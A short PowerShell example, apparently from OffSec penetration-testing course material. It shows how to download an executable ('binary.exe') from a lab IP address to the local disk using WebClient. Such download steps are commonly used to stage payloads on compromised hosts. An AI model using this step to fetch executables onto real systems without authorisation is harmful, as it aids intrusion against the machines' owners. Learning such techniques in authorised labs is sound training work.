# Example of wget script to download file
# Credit Offsec 2023

$webclient = New-Object System.Net.WebClient
$url = "http://192.168.118.3/binary.exe"
$file = "binary.exe"
$webclient.DownloadFile($url,$file)
